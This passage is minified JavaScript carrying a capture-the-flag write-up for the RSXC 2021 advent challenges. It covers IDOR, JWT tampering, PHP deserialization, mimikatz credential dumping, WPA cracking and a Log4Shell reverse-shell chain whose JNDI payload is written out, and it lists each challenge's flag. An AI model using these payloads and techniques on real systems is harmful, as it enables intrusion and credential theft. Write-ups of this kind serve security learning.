`),ss=e("a"),Nh=c("https://rsxc.no/af00ef8611422bdcd1606f51a55ccbccf16c6ac56a1bea01e4e725dae506aaf0/06-challenge.txt"),Si=u(),va=e("h3"),rt=e("a"),Wh=c("Solution"),Mi=u(),_a=e("figure"),Mp=e("img"),Ii=u(),wa=e("p"),Sh=c("The flag is "),Ip=e("code"),Mh=c("RSXC{isthisnotjustafancycaesarcipher}"),Oi=u(),Ea=e("h2"),ut=e("a"),Ih=c("[DAY 7] This is quite meta"),Fi=u(),Ta=e("h3"),kt=e("a"),Oh=c("Challenge"),zi=u(),ft=e("blockquote"),ht=e("p"),Fh=c(`We found this picture that seemed to contain the flag, but it seems like it has been cropped, are you able to help us retrieve the flag?
`),as=e("a"),zh=c("https://rsxc.no/6c9161113dadfbb06d6865f9db5499bd701067c9d69c2452894a8fcf697d21d9/07-challenge.jpg"),Ci=u(),ya=e("h3"),dt=e("a"),Ch=c("Solution"),Di=u(),mt=e("p"),Dh=c("We are given an image file that seems to have some parts of it missing. I guessed from the title that it has something to do with the metadata of the image. Having this in mind, I began to look at it using exiftools:"),Yi=u(),Va=e("pre"),Zi=u(),xa=e("figure"),Op=e("img"),Ji=u(),Ua=e("p"),Yh=c("The flag is: "),Fp=e("code"),Zh=c("RSXC{Sometimes_metadata_hides_stuff}"),ji=u(),Ra=e("h2"),bt=e("a"),Jh=c("[DAY 8] The reference"),Pi=u(),Na=e("h3"),gt=e("a"),jh=c("Challenge"),Hi=u(),vt=e("blockquote"),_t=e("p"),Ph=c(`I just created a new note saving application, there is still some improvements that can be made but I still decided to show it to you!
`),ns=e("a"),Hh=c("http://rsxc.no:20008"),Ai=u(),Wa=e("h3"),wt=e("a"),Ah=c("Solution"),Xi=u(),V=e("p"),Xh=c("We are given a link to a page with different notes saved. Out of all the notes we see that, Note 2, Note 3 and Note 4 are available for us. Opening any of the note directs us to a php site with the GET request "),zp=e("code"),Gh=c("id"),qh=c(" of that note number: "),Cp=e("code"),Bh=c("http://rsxc.no:20008/notes.php?id=2"),$h=c(". By directly changing the value of "),Dp=e("code"),Qh=c("id"),Lh=c(" and the url to "),Yp=e("code"),Kh=c("http://rsxc.no:20008/notes.php?id=0"),sd=c(" we receive the flag."),Gi=u(),Sa=e("p"),ad=c("The flag is: "),Zp=e("code"),nd=c("RSXC{Remember_to_secure_your_direct_object_references}"),qi=u(),Ma=e("h2"),Et=e("a"),ed=c("[DAY 9] The reference 2"),Bi=u(),Ia=e("h3"),Tt=e("a"),td=c("Challenge"),$i=u(),yt=e("blockquote"),Vt=e("p"),od=c(`I see that someone managed to read my personal notes yesterday, so I have improved the security! Good luck!
`),es=e("a"),pd=c("http://rsxc.no:20009"),Qi=u(),Oa=e("h3"),xt=e("a"),ld=c("Solution"),Li=u(),Fa=e("figure"),Jp=e("img"),Ki=u(),Ut=e("p"),cd=c("Knowing the naming convention and the hash algorithm used for the note id, I could easily craft my own for \u201Cnote0\u201D:"),sr=u(),za=e("pre"),ar=u(),Z=e("p"),id=c("Navigating to the note with that id ("),ts=e("a"),rd=c("http://rsxc.no:20009/notes.php?id=65b29a77142a5c237d7b21c005b72157"),ud=c(") did however not give us the flag directly, and instead tells us that the note with the flag has the id of the md5 hash of the word "),jp=e("code"),kd=c("flag"),fd=c(". Doing the same steps as above and navigating to the note using this new note id gives us the flag:"),nr=u(),Ca=e("pre"),er=u(),Da=e("p"),hd=c("The flag is: "),Pp=e("code"),dd=c("RSXC{MD5_should_not_be_used_for_security.Especially_not_with_known_plaintext}"),tr=u(),Ya=e("h2"),Rt=e("a"),md=c("[DAY 10] Lookup"),or=u(),Za=e("h3"),Nt=e("a"),bd=c("Challenge"),pr=u(),Wt=e("blockquote"),St=e("p"),gd=c(`Sometimes you need to look up to get the answer you need.
`),os=e("a"),vd=c("http://rsxc.no:20010"),lr=u(),Ja=e("h3"),Mt=e("a"),_d=c("Solution"),cr=u(),J=e("p"),wd=c("Navigating to the page we see an input field telling us to \u201Clookup\u201D. After fuzzing for quite some time, I guessed that it could be something about DNS lookup as the title was hinting for it. However, running "),Hp=e("code"),Ed=c("dig"),Td=c(", "),Ap=e("code"),yd=c("nslookup"),Vd=c(" and so on didn\u2019t give me any useful results. After a while on a lucky guess I curl\u2019ed the url along with the headers thinking that there might be some useful request headers I might have overlooked, and there it is. The flag was included as a header:"),ir=u(),ja=e("pre"),rr=u(),Pa=e("p"),xd=c("The flag is: "),Xp=e("code"),Ud=c("RSXC{Sometimes_headers_can_tell_you_something_useful}"),ur=u(),Ha=e("h2"),It=e("a"),Rd=c("[DAY 11] The not so random prime"),kr=u(),Aa=e("h3"),Ot=e("a"),Nd=c("Challenge"),fr=u(),Ft=e("blockquote"),zt=e("p"),Wd=c(`We intercepted some traffic from a malicious actor. They seemed to be using a not so secure implementation of RSA, could you help us figure out how they did it?
`),ps=e("a"),Sd=c("https://rsxc.no/af6c1a2345b4de89831605d6c9cd9307b6b54df0bd6bd8c506317277119457e8/11-challenge.zip"),hr=u(),Xa=e("h3"),Ct=e("a"),Md=c("Solution"),dr=u(),xs=e("p"),Id=c("We are given a rsa encryption script and it\u2019s output. Observing the code, we can first see that there\u2019s something strange with the prime generation. The problem is that it doesn\u2019t generate two independent random primes as an RSA encryption scheme should. Instead it generates an independent random prime number p (with 1023 or 1024 bits), then a random prime q obtained by the line: "),Gp=e("code"),Od=c("q = nextprime(p * p)"),Fd=c(" (meaning that q is generated with dependent on p)."),mr=u(),j=e("p"),zd=c("Knowing this, we know that N is approximately "),qp=e("code"),Cd=c("p^3"),Dd=c(", and taking the cuberoot of N, we can get the approximate for p. Knowing the approximate p or the exact p itself we can easily find "),Bp=e("code"),Yd=c("q"),Zd=c(" and then decrypt everything. A quick python script can be seen below:"),br=u(),Ga=e("pre"),gr=u(),qa=e("p"),Jd=c("The flag is: "),$p=e("code"),jd=c("RSXC{Good_Job!I_see_you_know_how_to_do_some_math_and_how_rsa_works}"),vr=u(),Ba=e("h2"),Dt=e("a"),Pd=c("[DAY 12] Twelve seconds of encoding"),_r=u(),$a=e("h3"),Yt=e("a"),Hd=c("Challenge"),wr=u(),Zt=e("blockquote"),Qp=e("p"),Ad=c(`For this challenge you need to do some encoding, but remember, you need to do it quickly, before the time runs out.
rsxc.no:20012`),Er=u(),Qa=e("h3"),Jt=e("a"),Xd=c("Solution"),Tr=u(),jt=e("p"),Gd=c("We are given an address to connect to, connecting to it prompts us to solve 100 different encoding and string manipulation tasks in under 12 seconds. As this is probably not possible to do manually by hand, I opted to solve this using python and pwntools. A quick and dirty code for the solution can be seen below:"),yr=u(),La=e("pre"),Vr=u(),Ka=e("p"),qd=c("The flag is: "),Lp=e("code"),Bd=c("RSXC{Seems_like_you_have_a_knack_for_encoding_and_talking_to_servers!}"),xr=u(),sn=e("h2"),Pt=e("a"),$d=c("[DAY 13] New technology is hard"),Ur=u(),an=e("h3"),Ht=e("a"),Qd=c("Challenge"),Rr=u(),At=e("blockquote"),Xt=e("p"),Ld=c(`When starting with new languages and frameworks, it is easy to get confused, and do things you shouldn\u2019t.
`),ls=e("a"),Kd=c("http://rsxc.no:20013"),Nr=u(),nn=e("h3"),Gt=e("a"),sm=c("Solution"),Wr=u(),Us=e("p"),am=c("Navigating to the site, we are greeted with a basic beginner todo list example in React. However just as the description says, the user seemed to have published the project in development mode and not in production. This means that the source code of the page could be seen. Looking through the source code, we see a base64 string at the file "),Kp=e("code"),nm=c("Todos.js"),em=c("."),Sr=u(),en=e("pre"),Mr=u(),qt=e("p"),tm=c("Decrypting it gives us the flag:"),Ir=u(),tn=e("pre"),Or=u(),on=e("p"),om=c("The flag is: "),sl=e("code"),pm=c("RSXC{it_might_be_there_even_if_you_don't_include_it!}"),Fr=u(),pn=e("h2"),Bt=e("a"),lm=c("[DAY 14] JWT"),zr=u(),ln=e("h3"),$t=e("a"),cm=c("Challenge"),Cr=u(),Qt=e("blockquote"),Lt=e("p"),im=c(`Have you heard about the secure information sharing standard JWT? It can sometimes be a little confusing, but I think we got it all figured out.
`),cs=e("a"),rm=c("http://rsxc.no:20014"),Dr=u(),cn=e("h3"),Kt=e("a"),um=c("Solution"),Yr=u(),rn=e("figure"),al=e("img"),Zr=u(),so=e("p"),km=c("Navigating to the page with our new and tampered JWT cookie gives us the flag:"),Jr=u(),un=e("pre"),jr=u(),kn=e("p"),fm=c("The flag is: "),nl=e("code"),hm=c("RSXC{You_have_to_remember_to_limit_what_algorithms_are_allowed}"),Pr=u(),fn=e("h2"),ao=e("a"),dm=c("[DAY 15] JWT 2"),Hr=u(),hn=e("h3"),no=e("a"),mm=c("Challenge"),Ar=u(),eo=e("blockquote"),to=e("p"),bm=c(`I can admit I might not have figured out everything, but I think everything should be figured out now! I have however implemented a new header I found in RFC 7515.
`),is=e("a"),gm=c("http://rsxc.no:20015"),Xr=u(),dn=e("h3"),oo=e("a"),vm=c("Solution"),Gr=u(),f=e("p"),_m=c("This challenge seemed to be the same as day 15 but with just "),el=e("code"),wm=c("kid"),Em=c("-issues added. "),tl=e("code"),Tm=c("kid"),ym=c(" is an optional header claim which holds a key identifier, useful when we have multiple keys to sign the tokens and need to look up the right one to verify the signature. However, we can from this knowledge, utilize it as a type of path traversal giving either an error if the file exists or not. If the "),ol=e("code"),Vm=c("kid"),xm=c(" file path check is used within php functions such as "),pl=e("code"),Um=c("include"),Rm=c(" or "),ll=e("code"),Nm=c("file_get_content"),Wm=c(" one could also inject the data in, reading the source. After much trial and error using the well known python "),rs=e("a"),Sm=c("jwt_tool"),Mm=c(" for tampering with the token, we find that setting the "),cl=e("code"),Im=c("kid"),Om=c(" value to a php file from the website will print out the data in plaintext for us. Knowing this, I set the "),il=e("code"),Fm=c("kid"),zm=c(" value to "),rl=e("code"),Cm=c("portal.php"),Dm=c(" (the page responsible for checking and authing the JWT token). Using that tampered token on navigation did give us the flag:"),qr=u(),mn=e("pre"),Br=u(),bn=e("pre"),$r=u(),gn=e("p"),Ym=c("The flag is: "),ul=e("code"),Zm=c("RSXC{Don't_let_others_decide_where_your_keys_are_located}"),Qr=u(),vn=e("h2"),po=e("a"),Jm=c("[DAY 16] A scary command"),Lr=u(),_n=e("h3"),lo=e("a"),jm=c("Challenge"),Kr=u(),co=e("blockquote"),io=e("p"),Pm=c(`Sometimes while monitoring networks and machines, or doing incident response, we find some obfuscated commands. We didn\u2019t have time to deobfuscate this, and it is not recommended to just run it. Could you help us with it?
`),us=e("a"),Hm=c("https://rsxc.no/dfb61488866658d31e3e7ccd2287caf233108a7eb917da6aefde3792d0fd79d2/16-challenge.sh"),su=u(),wn=e("h3"),ro=e("a"),Am=c("Solution"),au=u(),Rs=e("p"),Xm=c("Downloading the shell file, we see some obfuscated bash scripting. Running this blindly is probably not a good idea as just as the title says, it might be a scary command. What I began to do in order to reverse this obfuscation is to comment out the "),kl=e("code"),Gm=c("eval"),qm=c(" commands and swapping it with echo, seen below. Running this following script outputs some further steps to do:"),nu=u(),En=e("pre"),eu=u(),Tn=e("pre"),tu=u(),Ns=e("p"),Bm=c("Running this command output, we see something that resembles the source code of the bash script we just ran. But the variable "),fl=e("code"),$m=c("s"),Qm=c(" seemed to have changed."),ou=u(),yn=e("pre"),pu=u(),Ws=e("p"),Lm=c("Further I piped this bash output into a new file "),hl=e("code"),Km=c("16-challenge2.sh"),s2=c(", adding the neccessary edits and modifications to safely run the code:"),lu=u(),Vn=e("pre"),cu=u(),uo=e("p"),a2=c("Running this script gave somewhat similar output as before, however when executing the output command we get something quite new:"),iu=u(),xn=e("pre"),ru=u(),P=e("p"),n2=c("Looking like we\u2019re nearing the final steps as there is some commands piped into "),dl=e("code"),e2=c("sh"),t2=c(", I write the output into the final bash file "),ml=e("code"),o2=c("16-challenge3.sh"),p2=c(" with some minor changes once again:"),uu=u(),Un=e("pre"),ku=u(),N=e("p"),l2=c("Running this bash script gave a completely different output with a quite large hexadecimal piped into "),bl=e("code"),c2=c("xxd"),i2=c(" and then "),gl=e("code"),r2=c("sh"),u2=c(" for execution. Further running this command directly without executing ("),vl=e("code"),k2=c("| sh"),f2=c(") gives:"),fu=u(),Rn=e("pre"),hu=u(),ko=e("p"),h2=c("The output seemed to be a navigation to the an url containing the flag, but opening the page gives us a 404 Not Found response. However, looking at the comments after the curl command we see some strings looking similar to an base64 encoded string. Decoding the comment gives us the flag:"),du=u(),Nn=e("pre"),mu=u(),Wn=e("p"),d2=c("The flag is: "),_l=e("code"),m2=c("RSXC{Don't_blindly_trust_obfuscated_code_it_might_do_something_bad}"),bu=u(),Sn=e("h2"),fo=e("a"),b2=c("[DAY 17] My XMas card"),gu=u(),Mn=e("h3"),ho=e("a"),g2=c("Challenge"),vu=u(),mo=e("blockquote"),bo=e("p"),v2=c(`We felt like it\u2019s time to start sending out some XMas cards, maybe you find something you like?
`),ks=e("a"),_2=c("http://rsxc.no:20017"),_u=u(),In=e("h3"),go=e("a"),w2=c("Solution"),wu=u(),m=e("p"),E2=c("Navigating to the page we are greeted with a Xmas card along with the lines of \u201CFinding your card in /files\u201D. This hint tells us that there exists a directory/path to "),wl=e("code"),T2=c("/files"),y2=c(". Going to that said directory, we can see that there are 3 files: "),El=e("code"),V2=c("card.txt"),x2=c(", "),Tl=e("code"),U2=c("index.php-1"),R2=c(" and "),yl=e("code"),N2=c("flag.txt"),W2=c(". Guessing that the flag is in the "),Vl=e("code"),S2=c("flag.txt"),M2=c(" file, I get a forbidden error on opening it as I don\u2019t have permission to access the resource. Looking at all the other files we see that the content of "),xl=e("code"),I2=c("card.txt"),O2=c(" is loaded and read at "),Ul=e("code"),F2=c("index.php"),z2=c(", and the source code could be seen in "),Rl=e("code"),C2=c("index.php-1"),D2=c(":"),Eu=u(),On=e("pre"),Tu=u(),W=e("p"),Y2=c("Looking at the source code we can see that this challenge is about PHP Deserialization/Object Injection. By sending in an arbitrary base64 serialized "),Nl=e("code"),Z2=c("Card"),J2=c(" object to the GET request input, the object is constructed and the method "),Wl=e("code"),j2=c("displayCard()"),P2=c(" is run. Knowing the vulnerability, solving the challenge has become as easy as creating my own class of "),Sl=e("code"),H2=c("Card"),A2=c(" and then serializing it:"),yu=u(),Fn=e("pre"),Vu=u(),zn=e("pre"),xu=u(),Cn=e("p"),X2=c("The flag is: "),Ml=e("code"),G2=c("RSXC{Care_needs_to_be_taken_with_user_supplied_input.It_should_never_be_trusted}"),Uu=u(),Dn=e("h2"),vo=e("a"),q2=c("[DAY 18] Remember the flag? Docker remembers"),Ru=u(),Yn=e("h3"),_o=e("a"),B2=c("Challenge"),Nu=u(),wo=e("blockquote"),Eo=e("p"),$2=c(`We found a docker image, but it seems that the flag has been removed from it, could you help us get it back?
`),fs=e("a"),Q2=c("https://rsxc.no/798d1de7d544fe090786f5930d137b863ff46dd19a018882ed2812a835517d1b/18-challenge.zip"),Wu=u(),Zn=e("h3"),To=e("a"),L2=c("Solution"),Su=u(),Ss=e("p"),K2=c("We are given a zip file containing a docker image. Usually what one would start with a challenge similar like this is to analyze the different commands and files found in dockerfile and container. However, after unzipping it and just simply running "),Il=e("code"),s1=c("strings"),a1=c(" and greping for the flag on the uncompressed file gives us the flag in plaintext\u2026 Sometimes, solving a challenge can be as easy as just that."),Mu=u(),Jn=e("pre"),Iu=u(),jn=e("p"),n1=c("The flag is: "),Ol=e("code"),e1=c("RSXC{Now_you_know_that_docker_images_are_like_onions.They_have_many_layers}"),Ou=u(),Pn=e("h2"),yo=e("a"),t1=c("[DAY 19] The inclusive xmas cards"),Fu=u(),Hn=e("h3"),Vo=e("a"),o1=c("Challenge"),zu=u(),xo=e("blockquote"),Uo=e("p"),p1=c(`We felt that the our last xmas cards weren\u2019t that inclusive. So we made even more options, so everyone has one that fits them!
`),hs=e("a"),l1=c("http://rsxc.no:20019"),Cu=u(),An=e("h3"),Ro=e("a"),c1=c("Solution"),Du=u(),g=e("p"),i1=c("Similar to the challenge from day 17, we are greeted with a page containing different xmas cards after navigting to the website. However, different from the previous challenge, there is no source code to be found at the directory "),Fl=e("code"),r1=c("/files"),u1=c(". The only text files we could see was "),zl=e("code"),k1=c("flag.txt"),f1=c(", "),Cl=e("code"),h1=c("santa.txt"),d1=c(", "),Dl=e("code"),m1=c("snowmen.txt"),b1=c(" and "),Yl=e("code"),g1=c("tree.txt"),v1=c(". Again, we don\u2019t have permission to open "),Zl=e("code"),_1=c("flag.txt"),w1=c(" just as last time."),Yu=u(),E=e("p"),E1=c("Testing the application and opening the "),Jl=e("code"),T1=c("xmas tree"),y1=c(" card for instance, we see that we are directed to the url: "),jl=e("code"),V1=c("http://rsxc.no:20019/card.php?card=dHJlZS50eHQ="),x1=c(", the same php file "),Pl=e("code"),U1=c("card.php"),R1=c(" as last time with the GET request of "),Hl=e("code"),N1=c("?card=dHJlZS50eHQ="),W1=c(". This time, the GET requests seems to be something that resembles a base64 encoded string. After trying to decode the base64, I could guess how the challenge could be solved as the encryption is just base64\u2019ing the desired file input at the directory "),Al=e("code"),S1=c("/files"),M1=c("."),Zu=u(),Xn=e("pre"),Ju=u(),H=e("p"),I1=c("Since we can control the GET request input of "),Xl=e("code"),O1=c("card"),F1=c(", reading the flag is as easy as requesting for the file "),Gl=e("code"),z1=c("flag.txt"),C1=c(" encoded in base64:"),ju=u(),Gn=e("pre"),Pu=u(),qn=e("p"),D1=c("The flag is: "),ql=e("code"),Y1=c("RSXC{It_is_not_smart_to_let_people_include_whatever_they_want}"),Hu=u(),Bn=e("h2"),No=e("a"),Z1=c("[DAY 20] Easy mistakes"),Au=u(),$n=e("h3"),Wo=e("a"),J1=c("Challenge"),Xu=u(),So=e("blockquote"),Mo=e("p"),j1=c(`When programming, it is easy to make simple mistakes, and some of them can have dire consequences.
`),ds=e("a"),P1=c("http://rsxc.no:20020"),Gu=u(),Qn=e("h3"),Io=e("a"),H1=c("Solution"),qu=u(),Oo=e("p"),A1=c("Upon navigating to the site we are greeted with the source code of the challenge:"),Bu=u(),Ln=e("pre"),$u=u(),T=e("p"),X1=c("Looking at the code we can see that the api path takes in two inputs as JSON body requests, "),Bl=e("code"),G1=c("hmac"),q1=c(" and "),$l=e("code"),B1=c("host"),$1=c(". Upon receiving the correct body input, it signs the "),Ql=e("code"),Q1=c("host"),L1=c(" input with a secret using the hashing algorithm "),Ll=e("code"),K1=c("sha256"),sb=c(" and comparing the result with the "),Kl=e("code"),ab=c("hmac"),nb=c(" input. The flag is then outputted if these two values compared are the same. However, what the application did not take into consideration is that we have control over both the unsigned value that is to be signed, and the result of the signed. This means that sending in an empty value/string on both inputs, ie. signing an empty message results in an empty message, would give us the flag:"),Qu=u(),Kn=e("pre"),Lu=u(),se=e("p"),eb=c("The flag is: "),sc=e("code"),tb=c("RSXC{You_have_to_have_the_right_order_for_arguments!}"),Ku=u(),ae=e("h2"),Fo=e("a"),ob=c("[DAY 21] Nice memories"),sk=u(),ne=e("h3"),zo=e("a"),pb=c("Challenge"),ak=u(),Co=e("blockquote"),Do=e("p"),lb=c(`Note: The flag is the clear text password for river-security-xmas user.
On a IR mission we found that the threatactor dumped lsass file.
Can you rock our world and find the flag for us?
`),ms=e("a"),cb=c("https://rsxc.no/35a2c6961adc6886665363b6f47c3a156356a91a4cf602416b250aa4daca4167/21-challenge.zip"),nk=u(),ee=e("h3"),Yo=e("a"),ib=c("Solution"),ek=u(),A=e("p"),rb=c("We are given a system dump of the lsass file. To make it easier for myself, as this was a Windows dump, I opted to use mimikatz on my Windows PC to dump the passwords from the memory dump file "),ac=e("code"),ub=c("lsass.DMP"),kb=c(" instead of my usual linux setup "),nc=e("em"),fb=c("(this is due to not having an instance of kali linux ready)"),hb=c("."),tk=u(),te=e("pre"),ok=u(),y=e("p"),db=c("After getting the NTLM hash ("),ec=e("code"),mb=c("7801ee9c5762bb027ee224d54cb8f62e"),bb=c(") of the password for the user "),tc=e("code"),gb=c("river-security-xmas"),vb=c(" through mimikatz. With the hint of "),oc=e("code"),_b=c("Can you rock our world and find the flag for us?"),wb=c(", hinting to the use of "),pc=e("code"),Eb=c("rockyou.txt"),Tb=c(", I bruteforced the password of this hash using "),lc=e("code"),yb=c("john-the-ripper"),Vb=c(" (a password cracking tool running on the CPU):"),pk=u(),oe=e("pre"),lk=u(),pe=e("p"),xb=c("The flag is: "),cc=e("code"),Ub=c("alliwantforchristmasisyou"),ck=u(),le=e("h2"),Zo=e("a"),Rb=c("[DAY 22] Wireless communication"),ik=u(),ce=e("h3"),Jo=e("a"),Nb=c("Challenge"),rk=u(),jo=e("blockquote"),ic=e("p"),Wb=c(`We tried to find a new way of sending the flag, and this time it is even encrypted! Since we are nice we will even give you a hint. The password starts with S. Can you Rock our world?
https:///rsxc.no/5512383c4c02768617233eefdd4f79efe5dea9d08a850c8414644abf296845cf/22-challenge.cap`),uk=u(),ie=e("h3"),Po=e("a"),Sb=c("Solution"),kk=u(),v=e("p"),Mb=c("We are given a pcap file containing some WPA network sniffed packet. Along with the hint of "),rc=e("code"),Ib=c('"Can you Rock our world?"'),Ob=c(", hinting to the usage of "),uc=e("code"),Fb=c("rockyou.txt"),zb=c(". I guessed we could recover or bruteforce the password starting with an "),kc=e("code"),Cb=c("S"),Db=c(" for this network for us to read the encrypted data. Since I didn\u2019t have any computer with GPU on hand, bruteforcing with a tool running with CPU such as "),fc=e("code"),Yb=c("john-the-ripper"),Zb=c(" or "),hc=e("code"),Jb=c("aircrack-nk"),jb=c(" was the only choice. I chose to go with the latter, "),dc=e("code"),Pb=c("aircrack-ng"),Hb=c(" (an 802.11 WEP and WPA/WPA2-PSK key cracking program), for this job."),fk=u(),Ms=e("p"),Ab=c("In order to make the bruteforcing a lot faster, I narrowed down the wordlist of rockyou by filtering out the passwords starting with an uppercase "),mc=e("code"),Xb=c("S"),Gb=c(" through a quick python script:"),hk=u(),re=e("pre"),dk=u(),Ho=e("p"),qb=c("After having filtered out and produced a smaller wordlist, retrieving the password of the network is just as simple as running the following command:"),mk=u(),ue=e("pre"),bk=u(),Is=e("p"),Bb=c("The password we retrieved is: "),bc=e("code"),$b=c("Santaclaws99"),Qb=c("."),gk=u(),Os=e("div"),Ao=e("figure"),gc=e("img"),Xo=e("figure"),vc=e("img"),vk=u(),ke=e("figure"),_c=e("img"),_k=u(),fe=e("p"),Lb=c("The flag is: "),wc=e("code"),Kb=c("RSXC{WIFI_is_fun}"),wk=u(),he=e("h2"),Go=e("a"),s0=c("[DAY 23] Locating the location"),Ek=u(),de=e("h3"),qo=e("a"),a0=c("Challenge"),Tk=u(),Bo=e("blockquote"),$o=e("p"),n0=c(`We seem to have lost a file, can you please help us find it?
`),bs=e("a"),e0=c("http://rsxc.no:20023"),yk=u(),me=e("h3"),Qo=e("a"),t0=c("Solution"),Vk=u(),X=e("p"),o0=c("Upon navigating to the site, we are greeted with a text saying that a "),Ec=e("code"),p0=c("flag.txt"),l0=c(" file was lost in a subfolder on the server hosting the site. The directory name is said to also be found in dirb\u2019s "),Tc=e("code"),c0=c("small.txt"),i0=c(" wordlist, and that the functionality of directory listing is not enabled, meaning we will receive a status code of 200 whatever directory we search for."),xk=u(),G=e("p"),r0=c("From this I could guess that this challenge was of content discovery and directory bruteforcing, and was thus the approach I began to try. Knowing that the directory listing is not enabled, I knew that I couldn\u2019t run the wordlist as it is, but have to somehow manipulate it by directly searching for the file "),yc=e("code"),u0=c("flag.txt"),k0=c(". This was done by modifying the wordlist a little by appending the path "),Vc=e("code"),f0=c("/flag.txt"),h0=c(" to every line in the wordlist. A quick python script for this can be seen here:"),Uk=u(),be=e("pre"),Rk=u(),Fs=e("p"),d0=c("Running "),xc=e("code"),m0=c("gobuster"),b0=c(", a directory bruteforcing tool, on the modified wordlist and then outputting the results of the body length (response length) to a file, I can search for the flag as a response with a response length different from the others:"),Nk=u(),ge=e("pre"),Wk=u(),ve=e("p"),g0=c("The flag is: "),Uc=e("code"),v0=c("RSXC{Content_discovery_is_a_useful_to_know.Good_job_finding_the_flag}"),Sk=u(),_e=e("h2"),Lo=e("a"),_0=c("[DAY 24] The watcher"),Mk=u(),we=e("h3"),Ko=e("a"),w0=c("Challenge"),Ik=u(),sp=e("blockquote"),ap=e("p"),E0=c(`We have found a service that watches our every step, are you able to figure out how we can read the FLAG from the environment? NB. Container will be restarted every 30 minutes.
`),gs=e("a"),T0=c("http://rsxc.no:20024"),Ok=u(),Ee=e("h3"),np=e("a"),y0=c("Solution"),Fk=u(),_=e("p"),V0=c("Looking at the challenge description I could guess from the get go that it was going to be about the new vulnerability known as Log4Shell ("),Rc=e("code"),x0=c("CVE-2021-44228"),U0=c(") affecting the Java logging package "),Nc=e("code"),R0=c("log4j"),N0=c(". To confirm this, navigating to the site, we are greeted with the sentence of "),Wc=e("code"),W0=c("Be careful, I'm logging everything..."),S0=c(" hinting to some form of "),Sc=e("code"),M0=c("logging"),I0=c(". Fuzzing for some directories such as "),Mc=e("code"),O0=c("http://rsxc.no:20024/test"),F0=c(" for instance, results in a "),Ic=e("code"),z0=c("Whitelabel Error Page"),C0=c(" due to not having set up a dedicated error page yet. Googling this tells us that we are indeed working with a Java web application, running on Spring Boot:"),zk=u(),ep=e("blockquote"),Oc=e("p"),D0=c("WhiteLabel Error Page is a generic Spring Boot error page that is displayed when no custom error page is present."),Ck=u(),zs=e("p"),Y0=c("Using the site "),vs=e("a"),Z0=c("https://log4j-tester.trendmicro.com/"),J0=c(" I can test for locations suitable for the JNDI attack vector, and further finds that most of the user-supplied data and headers could actually be exploited as \u201Ceverything is being logged\u201D. For this case, I used the User-Agent header. To further test this for ourselves, preparing a netcat listener, and then curl\u2019ing the site with the JNDI payload results in a connection:"),Dk=u(),Te=e("pre"),Yk=u(),ye=e("pre"),Zk=u(),tp=e("p"),j0=c("The site is indeed confirmed to be vulnerable to Log4Shell!"),Jk=u(),op=e("p"),P0=c("To exploiting the server, I setup my attack chain like so:"),jk=u(),z=e("ol"),Ve=e("li"),H0=c("Begin with a payload of "),Fc=e("code"),A0=c("${jndi:ldap://localhost:1389/Exploit}"),X0=c(" that reaches our LDAP Referral Server"),G0=u(),zc=e("li"),q0=c("Our LDAP Referral Server then forwards the request to a secondary HTTP server http://localhost:8000/Exploit.class"),B0=u(),Cc=e("li"),$0=c("The victim server will then retrieve and execute the code present in http://localhost:8000/Exploit.class, making it possible to run arbitrary code and command we send in"),Pk=u(),q=e("p"),Q0=c("Utilizing both the tool localtunnel ("),Dc=e("code"),L0=c("lt -port 8000"),K0=c(") and ngrok ("),Yc=e("code"),s3=c("ngrok tcp 1389"),a3=c("), I can expose my localhost connection to the Internet freely using two computers hosting the local servers for the attack. The following tunnel forwarding is in this case, as such:"),Hk=u(),xe=e("pre"),Ak=u(),Cs=e("p"),n3=c("First, with the "),_s=e("a"),e3=c("marshalsec utility"),t3=c(", I start my LDAP referral server to direct connections to my secondary HTTP server:"),Xk=u(),Ue=e("pre"),Gk=u(),pp=e("p"),o3=c("Following that I set up the HTTP server, and also start the netcat listener on the other computer:"),qk=u(),Re=e("pre"),Bk=u(),Ne=e("pre"),$k=u(),Ds=e("p"),p3=c("Having all the servers correctly up and running, the finishing touches for the attack payload would be to fix up the code for the exploit ("),Zc=e("code"),l3=c("Exploit.class"),c3=c(") and then running a curl to the server with our attack payload. A exploit code solution for a reverse shell can be seen below:"),Qk=u(),We=e("pre"),Lk=u(),lp=e("p"),i3=c("Having everything ready and set up, we run our attack:"),Kk=u(),Se=e("pre"),sf=u(),Ys=e("p"),r3=c("Upon running the two commands above, we receive a reverse shell on our netcat listener and can freely "),Jc=e("code"),u3=c("cat"),k3=c(" the flag:"),af=u(),Me=e("pre"),nf=u(),Ie=e("p"),f3=c("The flag is: "),jc=e("code"),h3=c("RSXC{We_do_like_logging_right?}"),this.h()},l(s){h=t(s,"P",{});var p=o(h);C=i(p,"Here is Shirajuki\u2019s write-up of the challenges of the company River Security\u2019s capture the flag advent calendar for 2021, RSXC."),p.forEach(a),D=k(s),O=t(s,"H2",{id:!0});var hg=o(O);d=t(hg,"A",{href:!0});var dg=o(d);F=i(dg,"[DAY 1] The search"),dg.forEach(a),hg.forEach(a),js=k(s),Ps=t(s,"H3",{id:!0});var mg=o(Ps);ze=t(mg,"A",{href:!0});var bg=o(ze);yf=i(bg,"Challenge"),bg.forEach(a),mg.forEach(a),Pc=k(s),ws=t(s,"BLOCKQUOTE",{});var ef=o(ws);Hs=t(ef,"P",{});var tf=o(Hs);Vf=i(tf,"Welcome to the River Security XMas Challenge (RSXC)! RSXC operates with the following flag format for most challenges "),vp=t(tf,"CODE",{});var gg=o(vp);xf=i(gg,"RSXC{flag}"),gg.forEach(a),Uf=i(tf,". If another flag format is used, the challenge text will mention this."),tf.forEach(a),Rf=k(ef),_p=t(ef,"P",{});var vg=o(_p);Nf=i(vg,"In this first challenge we have managed to forget which port we are listening on. Could you please find the port listening for traffic? We know it\u2019s in the range 30 000-31 000."),vg.forEach(a),ef.forEach(a),Hc=k(s),As=t(s,"H3",{id:!0});var _g=o(As);Ce=t(_g,"A",{href:!0});var wg=o(Ce);Wf=i(wg,"Solution"),wg.forEach(a),_g.forEach(a),Ac=k(s),De=t(s,"P",{});var Eg=o(De);Sf=i(Eg,"We have been told that there is an open port in the range 30000 - 31000 on the traffic of the domain. Using the network exploration tool and security, or port scanner tool, nmap. We easily find the port:"),Eg.forEach(a),Xc=k(s),Xs=t(s,"PRE",{class:!0});var WT=o(Xs);WT.forEach(a),Gc=k(s),Gs=t(s,"P",{});var d3=o(Gs);Mf=i(d3,"The flag is: "),wp=t(d3,"CODE",{});var Tg=o(wp);If=i(Tg,"RSXC{Congrats!You_found_the_secret_port_I_was_trying_to_hide!}"),Tg.forEach(a),d3.forEach(a),qc=k(s),qs=t(s,"H2",{id:!0});var yg=o(qs);Ye=t(yg,"A",{href:!0});var 